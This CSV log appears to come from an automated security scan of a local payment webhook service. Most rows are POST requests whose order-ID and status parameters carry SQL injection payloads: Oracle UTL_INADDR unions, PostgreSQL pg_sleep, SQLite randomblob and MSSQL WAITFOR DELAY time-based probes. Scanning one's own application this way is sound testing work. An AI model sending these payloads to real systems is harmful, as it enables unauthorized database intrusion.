ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
4685,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+,200,OK,9,92,0
4686,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+,200,OK,9,92,0
4687,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27,200,OK,8,92,0
4688,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%27+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%27,200,OK,12,92,0
4689,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22,200,OK,9,92,0
4690,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22,200,OK,7,92,0
4691,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+,200,OK,7,92,0
4692,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+and+exists+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+--+,200,OK,7,92,0
4693,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
4694,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,1,99,0
4695,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,0,99,0
4696,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4697,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end&statusReembolso=AguardandoRetornoProcessadora,200,OK,12,92,0
4698,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4699,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4700,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoRetornoProcessadora,200,OK,11,92,0
4701,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4702,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4703,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4704,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,9,92,0
4705,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,6,92,0
4706,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,200,OK,6,92,0
4707,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:43 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,200,OK,8,92,0
4708,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,8,92,0
4709,Sat Jun 22 16:53:43 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,13,92,0
4710,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,11,92,0
4711,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%27case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,6,92,0
4712,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,7,92,0
4713,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%22case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,9,92,0
4714,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+,200,OK,10,92,0
4715,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora+%2F+case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+,200,OK,4,92,0
4716,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000,404,Not Found,2,99,0
4717,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,1,99,0
4718,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
4719,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4720,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
4721,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,40,92,0
4722,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,38,92,0
4723,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4724,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,5,92,0
4725,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4726,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,6,92,0
4727,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=0pps3krkj4nr5h0yyysv3cfyrhsbepm8635kxivo09f3spgbcet0pewzu&status=AguardandoRetornoProcessadora,200,OK,7,92,0
4728,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=9tniix7rsf6yhr1ydoeg27wtgcg24fbjl2tbd7sf6nh9j201efire5fhb&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4729,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,10,92,0
4730,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,32,92,0
4731,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=3rzrub5z7g3kjjf44yox2jk3gmragfvcpavjvdurxxvdpfcd36mvelvmtm&status=AguardandoRetornoProcessadora,200,OK,31,92,0
4732,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=tgml1uxb6ccx4d3jwgq0qzotzy1jae46ttdhpi3bnlrhxnbfpye70av0ip&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
4733,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4734,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4735,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+&status=AguardandoRetornoProcessadora,200,OK,10,92,0
4736,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+&statusReembolso=AguardandoRetornoProcessadora,200,OK,7,92,0
4737,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,5,92,0
4738,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=gr9v7r2rbheit7lxqcnqx4rx1zoyaje1q30coa7jnrxjzm0lswleqs1o2o0l&status=AguardandoRetornoProcessadora,200,OK,34,92,0
4739,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=AguardandoRetornoProcessadora,200,OK,30,92,0
4740,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4741,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+,200,OK,9,92,0
4742,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=AguardandoRetornoProcessadora,200,OK,6,92,0
4743,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+,200,OK,9,92,0
4744,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+,200,OK,10,92,0
4745,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+,200,OK,10,92,0
4746,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=hpg8ye4rnfsxwf7gz2261z9ltv63xdd803if8hr2mna23v6fojtkykg1,200,OK,31,92,0
4747,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=iir7yyjkr0lruucwt71oz1mcrzb5ws9dsfh2enjwz10qczz2vcwz6meocg,200,OK,32,92,0
4748,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+randomblob%281000000%29+when+not+null+then+1+else+1+end+,200,OK,7,92,0
4749,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+,200,OK,8,92,0
4750,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+,200,OK,7,92,0
4751,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+,200,OK,9,92,0
4752,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+,200,OK,8,92,0
4753,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=5m7cysf5qnpvtuz7m4ijluxaaaws0jpwrjjs6h7vlt8hnqv3xwda3kplix0f,200,OK,6,92,0
4754,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=6ta5jl34mih27wnvg1buks8e13lah833hn05xqs1w9htfloiqou34sqtdbt,200,OK,8,92,0
4755,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=case+randomblob%281000000000%29+when+not+null+then+1+else+1+end+,200,OK,34,92,0
4756,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=ekb7faj4bpafpgw260i11ilk9tsr5f05mi5hsvvve6ssyv0e2yjg53pekur1,200,OK,7,92,0
4757,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
4758,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,1,99,0
4759,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
4760,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000,404,Not Found,2,99,0
4761,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,1,99,0
4762,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
4763,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4764,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido+WAITFOR+DELAY+%270%3A0%3A15%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,12,92,0
4765,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoRetornoProcessadora,200,OK,8,92,0
4766,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,9,92,0
4767,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoRetornoProcessadora,200,OK,23,92,0
4768,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&statusReembolso=AguardandoRetornoProcessadora,200,OK,19,92,0
4769,Sat Jun 22 16:53:44 BRT 2024,Sat Jun 22 16:53:44 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&status=AguardandoRetornoProcessadora,200,OK,6,92,0
